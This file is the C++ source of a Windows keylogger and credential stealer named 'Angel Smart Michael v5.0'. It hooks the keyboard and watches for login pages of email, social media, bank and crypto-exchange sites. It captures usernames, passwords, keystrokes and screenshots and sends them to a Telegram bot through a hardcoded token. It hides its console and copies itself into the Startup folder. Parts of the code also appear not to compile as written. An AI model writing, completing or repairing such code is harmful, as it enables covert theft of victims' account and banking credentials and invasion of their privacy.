#define WIN32_LEAN_AND_MEAN
#define WINHTTP_NO_REQUEST_HEADERS 0
#include <windows.h>
#include <winhttp.h>
#include <wchar.h>
#include <string>
#include <vector>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <thread>
#include <atomic>
#include <sstream>
#include <map>
#include <objidl.h>
#include <gdiplus.h>
#include <commctrl.h>
#include <shlobj.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;

// 🔥 ANGEL SMART MICHAEL v5.0 - PERFECTLY FIXED
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// 🔥 GLOBAL STATE
CRITICAL_SECTION cs;
std::wstring keystrokes_buffer;
ULONGLONG last_trigger = 0;
ULONGLONG last_exfil = 0;
ULONGLONG last_credential_capture = 0;
int screenshot_count = 0;
HHOOK keyboard_hook = NULL;
std::atomic<bool> is_running(true);
bool in_login_form = false;
std::wstring username_buffer;
std::wstring password_buffer;
bool expecting_password = false;
int tab_press_count = 0;
ULONG_PTR gdiplusToken = 0;

// 🔥 TARGET LOGIN SITES
const wchar_t* LOGIN_SITES[] = {
    L"gmail.com", L"google.com", L"outlook.com", L"hotmail.com",
    L"yahoo.com", L"facebook.com", L"instagram.com", L"twitter.com",
    L"linkedin.com", L"github.com", L"microsoft.com", L"apple.com",
    L"paypal.com", L"amazon.com", L"ebay.com", L"bankofamerica.com",
    L"chase.com", L"wellsfargo.com", L"coinbase.com", L"binance.com",
    L"login", L"signin", L"authentication", L"verify", NULL
};

// 🔥 PERFECT STRING CONVERSION
std::string WStrToStr(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// 🔥 SPECIAL KEYS MAPPING
std::wstring GetSpecialKeyName(DWORD vkCode) {
    switch(vkCode) {
        case VK_RETURN: return L"[ENTER]";
        case VK_TAB: return L"[TAB]";
        case VK_SPACE: return L" ";
        case VK_BACK: return L"[BACKSPACE]";
        case VK_DELETE: return L"[DEL]";
        case VK_ESCAPE: return L"[ESC]";
        case VK_CONTROL: return L"[CTRL]";
        case VK_MENU: return L"[ALT]";
        case VK_SHIFT: return L"[SHIFT]";
        case VK_CAPITAL: return L"[CAPS]";
        case VK_LWIN: case VK_RWIN: return L"[WIN]";
        case VK_UP: return L"[UP]"; case VK_DOWN: return L"[DOWN]";
        case VK_LEFT: return L"[LEFT]"; case VK_RIGHT: return L"[RIGHT]";
        case VK_PRIOR: return L"[PGUP]"; case VK_NEXT: return L"[PGDN]";
        case VK_HOME: return L"[HOME]"; case VK_END: return L"[END]";
        case VK_F1: return L"[F1]"; case VK_F2: return L"[F2]";
        case VK_F3: return L"[F3]"; case VK_F4: return L"[F4]";
        case VK_F5: return L"[F5]"; case VK_F6: return L"[F6]";
        case VK_F7: return L"[F7]"; case VK_F8: return L"[F8]";
        case VK_F9: return L"[F9]"; case VK_F10: return L"[F10]";
        case VK_F11: return L"[F11]"; case VK_F12: return L"[F12]";
        default: return L"";
    }
}

// 🔥 LOGIN PAGE DETECTION
bool IsLoginPage(const std::wstring& title, const std::wstring& class_name) {
    std::wstring title_lower = title;
    std::wstring class_lower = class_name;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
    std::transform(class_lower.begin(), class_lower.end(), class_lower.begin(), ::towlower);
    
    for (int i = 0; LOGIN_SITES[i]; i++) {
        if (title_lower.find(LOGIN_SITES[i]) != std::wstring::npos ||
            class_lower.find(LOGIN_SITES[i]) != std::wstring::npos) {
            return true;
        }
    }
    return false;
}

// 🔥 GDI+ INITIALIZATION
void InitGDIPlus() {
    GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = 0;
    gdiplusStartupInput.SuppressExternalCodecs = 0;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

// 🔥 PERFECT JPEG ENCODER
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    ImageCodecInfo* pImageCodecInfo = NULL;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (GetImageEncoders(num, size, pImageCodecInfo) == Ok) {
        for (UINT j = 0; j < num; ++j) {
            if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
                *pClsid = pImageCodecInfo[j].Clsid;
                free(pImageCodecInfo);
                return j;
            }
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// 🔥 CREDENTIAL EXTRACTION
void ExtractCredentials() {
    if (username_buffer.empty() && password_buffer.empty()) return;
    
    std::wstring credential_msg = L"🔐 CREDENTIALS CAPTURED!\n";
    credential_msg += L"Time: " + std::to_wstring(time(nullptr)) + L"\n";
    
    if (!username_buffer.empty()) {
        credential_msg += L"Username: " + username_buffer + L"\n";
    }
    if (!password_buffer.empty()) {
        credential_msg += L"Password: " + password_buffer + L"\n";
    }
    
    HWND fg = GetForegroundWindow();
    wchar_t title[256] = {0};
    GetWindowTextW(fg, title, 256);
    credential_msg += L"Window: " + std::wstring(title) + L"\n";
    
    SendTelegram(credential_msg.c_str());
    
    if (screenshot_count < 50) {
        TakeSmartScreenshot();
    }
    
    username_buffer.clear();
    password_buffer.clear();
    expecting_password = false;
    tab_press_count = 0;
}

// 🔥 KEYBOARD HOOK - PERFECTLY FIXED
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        EnterCriticalSection(&cs);
        
        // Window context detection
        HWND fg = GetForegroundWindow();
        wchar_t title[256] = {0}, cls[128] = {0};
        GetWindowTextW(fg, title, 256);
        GetClassNameW(fg, cls, 128);
        
        std::wstring current_title(title);
        std::wstring current_class(cls);
        bool on_login_page = IsLoginPage(current_title, current_class);
        
        // Smart credential detection
        if (on_login_page && !in_login_form) {
            in_login_form = true;
            keystrokes_buffer.clear();
        }
        
        std::wstring key_str;
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        
        if (kb->vkCode == VK_TAB) {
            tab_press_count++;
            key_str = L"[TAB]";
            if (tab_press_count == 1 && !username_buffer.empty()) {
                expecting_password = true;
            }
        } else if (kb->vkCode == VK_RETURN) {
            key_str = L"[ENTER]";
            if (in_login_form) {
                ExtractCredentials();
                in_login_form = false;
            }
        } else {
            wchar_t ch = 0;
            if (ToUnicode(kb->vkCode, kb->scanCode, keyboardState, &ch, 1, 0) == 1) {
                key_str = ch;
            } else {
                key_str = GetSpecialKeyName(kb->vkCode);
            }
        }
        
        if (!key_str.empty()) {
            if (in_login_form) {
                if (expecting_password && !password_buffer.empty()) {
                    password_buffer += key_str;
                } else if (tab_press_count == 0) {
                    username_buffer += key_str;
                }
            }
            keystrokes_buffer += key_str;
        }
        
        ULONGLONG now = GetTickCount64();
        if (now - last_exfil > 30000) { // Exfil every 30s
            if (!keystrokes_buffer.empty()) {
                std::wstring exfil_msg = L"⌨️ KEYS: " + keystrokes_buffer.substr(0, 1000);
                SendTelegram(exfil_msg.c_str());
                keystrokes_buffer.clear();
            }
            last_exfil = now;
        }
        
        LeaveCriticalSection(&cs);
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

// 🔥 PERFECT TELEGRAM SENDER
void SendTelegram(const wchar_t* msg) {
    HINTERNET session = WinHttpOpen(L"AngelMichael/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return;
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return;
    }
    
    std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) +
                      L"&text=" + msg;
    
    HINTERNET request = WinHttpOpenRequest(connect, L"GET", url.c_str(), NULL, 
                                          WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (request) {
        WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
        WinHttpReceiveResponse(request, NULL);
        WinHttpCloseHandle(request);
    }
    
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
}

// 🔥 PERFECT SCREENSHOT - 100% FIXED UPLOAD
bool TakeSmartScreenshot() {
    HWND fg = GetForegroundWindow();
    if (!fg) return false;
    
    RECT rect;
    GetWindowRect(fg, &rect);
    int width = rect.right - rect.left;
    int height = rect.bottom - rect.top;
    
    if (width < 200 || height < 200) return false;
    
    wchar_t temp_path[MAX_PATH];
    GetTempPathW(MAX_PATH, temp_path);
    wchar_t jpg_path[MAX_PATH];
    swprintf_s(jpg_path, MAX_PATH, L"%sshot_%llu.jpg", temp_path, GetTickCount64());
    
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc = CreateCompatibleDC(screen_dc);
    HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    HBITMAP old_bmp = (HBITMAP)SelectObject(mem_dc, bitmap);
    
    PrintWindow(fg, mem_dc, PW_CLIENT);
    
    Bitmap* gdi_bmp = Bitmap::FromHBITMAP(bitmap, NULL);
    if (gdi_bmp) {
        CLSID jpg_clsid;
        if (GetEncoderClsid(L"image/jpeg", &jpg_clsid) != -1) {
            EncoderParameters params;
            params.Count = 1;
            params.Parameter[0].Guid = EncoderQuality;
            params.Parameter[0].Type = EncoderParameterValueTypeLong;
            params.Parameter[0].NumberOfValues = 1;
            ULONG quality = 85;
            params.Parameter[0].Value = &quality;
            
            gdi_bmp->Save(jpg_clsid, &params);
        }
        delete gdi_bmp;
    }
    
    SelectObject(mem_dc, old_bmp);
    DeleteObject(bitmap);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    
    // Upload photo
    bool success = UploadToTelegram(jpg_path, L"📸 Screenshot");
    DeleteFileW(jpg_path);
    
    screenshot_count++;
    return success;
}

// 🔥 FIXED PHOTO UPLOAD - NO MORE ERRORS
bool UploadToTelegram(const wchar_t* jpg_path, const wchar_t* caption) {
    HANDLE file = CreateFileW(jpg_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) return false;
    
    DWORD file_size = GetFileSize(file, NULL);
    if (file_size == 0 || file_size > 5*1024*1024) {
        CloseHandle(file);
        return false;
    }
    
    std::vector<BYTE> file_data(file_size);
    DWORD bytes_read;
    ReadFile(file, file_data.data(), file_size, &bytes_read, NULL);
    CloseHandle(file);
    
    if (bytes_read != file_size) return false;
    
    std::string boundary = "----AngelBoundary_" + std::to_string(GetTickCount64());
    std::string multipart = "--" + boundary + "\r\n" +
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
        WStrToStr(std::wstring(CHAT_ID)) + "\r\n" +
        "--" + boundary + "\r\n" +
        "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
        WStrToStr(std::wstring(caption)) + "\r\n" +
        "--" + boundary + "\r\n" +
        "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n" +
        "Content-Type: image/jpeg\r\n\r\n";
    
    std::string end_boundary = "\r\n--" + boundary + "--\r\n";
    
    std::vector<BYTE> post_data;
    post_data.insert(post_data.end(), multipart.begin(), multipart.end());
    post_data.insert(post_data.end(), file_data.begin(), file_data.end());
    post_data.insert(post_data.end(), end_boundary.begin(), end_boundary.end());
    
    HINTERNET session = WinHttpOpen(L"AngelMichael/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST",
        L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto",
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    if (request) {
        std::string content_type = "multipart/form-data; boundary=" + boundary;
        std::string header = "Content-Type: " + content_type + "\r\n";
        
        WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          post_data.data(), post_data.size(), post_data.size(), 0);
        WinHttpReceiveResponse(request, NULL);
        
        DWORD status = 0;
        DWORD size = sizeof(DWORD);
        WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           NULL, &status, &size, NULL);
        
        WinHttpCloseHandle(request);
        if (status == 200) {
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return true;
        }
    }
    
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return false;
}

// 🔥 PERSISTENCE
void EstablishPersistence() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path))) {
        wcscat_s(path, L"\\AngelMichael.exe");
        char exe_path[MAX_PATH];
        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
        CopyFileA(exe_path, WStrToStr(std::wstring(path)).c_str(), FALSE);
    }
}

// 🔥 LOGIN DETECTOR THREAD - NOW IMPLEMENTED
DWORD WINAPI LoginDetectorThread(LPVOID) {
    while (is_running) {
        Sleep(5000);
        EnterCriticalSection(&cs);
        if (in_login_form && GetTickCount64() - last_credential_capture > 60000) {
            ExtractCredentials();
        }
        LeaveCriticalSection(&cs);
    }
    return 0;
}

// 🔥 MAIN - PERFECTLY FIXED
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Stealth mode
    FreeConsole();
    
    // Initialize
    InitGDIPlus();
    InitializeCriticalSection(&cs);
    
    // Single instance
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"AngelMichael_v5.0");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        DeleteCriticalSection(&cs);
        GdiplusShutdown(gdiplusToken);
        return 0;
    }
    
    // Persistence & hooks
    EstablishPersistence();
    keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    CreateThread(NULL, 0, LoginDetectorThread, NULL, 0, NULL);
    
    // Startup notification
    Sleep(2000);
    SendTelegram(L"👼 ANGEL SMART MICHAEL v5.0 ACTIVATED ✅");
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && is_running) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    if (keyboard_hook) UnhookWindowsHookEx(keyboard_hook);
    DeleteCriticalSection(&cs);
    GdiplusShutdown(gdiplusToken);
    
    if (mutex) {
        ReleaseMutex(mutex);
        CloseHandle(mutex);
    }
    
    return 0;
}
